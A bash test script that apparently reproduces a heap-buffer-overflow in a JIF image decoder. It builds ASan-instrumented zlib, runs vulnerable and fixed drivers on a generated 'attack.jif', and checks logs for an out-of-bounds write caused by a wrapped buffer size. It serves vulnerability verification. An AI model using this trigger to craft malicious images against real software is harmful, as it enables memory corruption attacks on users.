#!/usr/bin/env bash
# Replay the verbatim JIF pin against REAL zlib 1.3.2 built with ASan.
# Complements run-real.sh (system libz, uninstrumented): here the OOB WRITE
# frame comes from inflate_fast/inflate, not a stand-in inflate().
set -u
cd "$(dirname "$0")"
mkdir -p evidence
pass=0
fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
has() { grep -q -- "$2" "$1" 2>/dev/null; }
hasnt(){ ! grep -q -- "$2" "$1" 2>/dev/null; }

if [ ! -f zlib-src/CMakeLists.txt ]; then
  mkdir -p zlib-src
  tar -xzf zlib-1.3.2.tar.gz -C zlib-src --strip-components=1
fi
ZLIB_BUILD=build-zlib
if [ ! -f "$ZLIB_BUILD/libz.a" ]; then
  cmake -S zlib-src -B "$ZLIB_BUILD" -DBUILD_SHARED_LIBS=OFF \
    -DCMAKE_C_FLAGS='-O0 -g -fsanitize=address -fno-omit-frame-pointer' \
    > evidence/cmake.log 2>&1 || { echo "FAIL zlib configure"; exit 1; }
  cmake --build "$ZLIB_BUILD" -j4 > evidence/zlib-build.log 2>&1 || \
    { echo "FAIL zlib build"; exit 1; }
fi
ok "real zlib 1.3.2 built with AddressSanitizer"

GLIB_CFLAGS=$(pkg-config --cflags glib-2.0)
GLIB_LIBS=$(pkg-config --libs glib-2.0)
gcc -O0 -g -Wall -fsanitize=address -fno-omit-frame-pointer -I. \
  -Izlib-src $GLIB_CFLAGS -o evidence/asan-driver-vuln asan-driver.c \
  "$ZLIB_BUILD/libz.a" $GLIB_LIBS -lm && ok "vulnerable ASan driver build" || \
  bad "vulnerable ASan driver build"
gcc -O0 -g -Wall -DVARIANT_FIXED -fsanitize=address -fno-omit-frame-pointer \
  -I. -Izlib-src $GLIB_CFLAGS -o evidence/asan-driver-fixed asan-driver.c \
  "$ZLIB_BUILD/libz.a" $GLIB_LIBS -lm && ok "fixed ASan driver build" || \
  bad "fixed ASan driver build"

python3 ../realglib/make-jif.py evidence/attack.jif bytes 4d \
  > evidence/make-attack.log 2>&1
python3 ../realglib/make-jif.py evidence/safe.jif safe 4d \
  > evidence/make-safe.log 2>&1

run() { # binary log mode arg
  ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 \
    "evidence/$1" "$3" "$4" > "evidence/$2" 2>&1
  return 0
}
run asan-driver-vuln asan-realz-bytes.log bytes 4d
run asan-driver-vuln asan-realz-file.log   file  evidence/attack.jif
run asan-driver-fixed asan-realz-file-fixed.log file evidence/attack.jif
run asan-driver-vuln asan-realz-file-safe.log  file evidence/safe.jif

echo "== real-zlib ASan WRITE, staged bytes =="
has evidence/asan-realz-bytes.log "ZLIB=1.3.2 DATA_SIZE=260 AVAIL_OUT=2147483778" && \
  ok "wrapped product reaches real zlib with 260-byte indexes" || \
  bad "wrapped product reaches real zlib with 260-byte indexes"
has evidence/asan-realz-bytes.log "ERROR: AddressSanitizer: heap-buffer-overflow" && \
  ok "ASan heap-buffer-overflow reported" || bad "ASan heap-buffer-overflow reported"
has evidence/asan-realz-bytes.log "WRITE of size 1" && \
  ok "ASan reports a WRITE" || bad "ASan reports a WRITE"
has evidence/asan-realz-bytes.log "in inflate_fast " && \
  ok "write frame inside real zlib inflate_fast" || \
  bad "write frame inside real zlib inflate_fast"
has evidence/asan-realz-bytes.log "in inflate " && \
  ok "write stack through real zlib inflate" || \
  bad "write stack through real zlib inflate"
has evidence/asan-realz-bytes.log "jif-vulnerable.inc:106" && \
  ok "call frame is the verbatim pinned inflate call" || \
  bad "call frame is the verbatim pinned inflate call"
has evidence/asan-realz-bytes.log "jif-vulnerable.inc:40" && \
  ok "allocation frame is the verbatim pinned indexes malloc" || \
  bad "allocation frame is the verbatim pinned indexes malloc"
has evidence/asan-realz-bytes.log "0 bytes after 260-byte region" && \
  ok "write starts exactly at the end of indexes" || \
  bad "write starts exactly at the end of indexes"

echo "== real-zlib ASan WRITE, on-disk JIF99a =="
has evidence/asan-realz-file.log "DATA_SIZE=4 AVAIL_OUT=2147483650" && \
  ok "on-disk frame descriptor reaches wrapped data_size 4" || \
  bad "on-disk frame descriptor reaches wrapped data_size 4"
has evidence/asan-realz-file.log "ERROR: AddressSanitizer: heap-buffer-overflow" && \
  ok "on-disk attack reports heap-buffer-overflow" || \
  bad "on-disk attack reports heap-buffer-overflow"
has evidence/asan-realz-file.log "WRITE of size 1" && \
  ok "on-disk attack reports a WRITE" || \
  bad "on-disk attack reports a WRITE"
has evidence/asan-realz-file.log "in inflate_fast " && \
  ok "on-disk write frame is real zlib inflate_fast" || \
  bad "on-disk write frame is real zlib inflate_fast"
has evidence/asan-realz-file.log "0 bytes after 4-byte region" && \
  ok "on-disk write starts at end of undersized indexes" || \
  bad "on-disk write starts at end of undersized indexes"

echo "== fixed and safe controls =="
has evidence/asan-realz-file-fixed.log "RC=0 ERR=image data" && \
  hasnt evidence/asan-realz-file-fixed.log "AddressSanitizer" && \
  ok "fixed pin rejects wrapped on-disk input with no ASan report" || \
  bad "fixed pin rejects wrapped on-disk input with no ASan report"
has evidence/asan-realz-file-safe.log "RC=1 ERR=" && \
  hasnt evidence/asan-realz-file-safe.log "AddressSanitizer" && \
  ok "safe 4x4 on-disk JIF is clean under ASan" || \
  bad "safe 4x4 on-disk JIF is clean under ASan"

echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ]
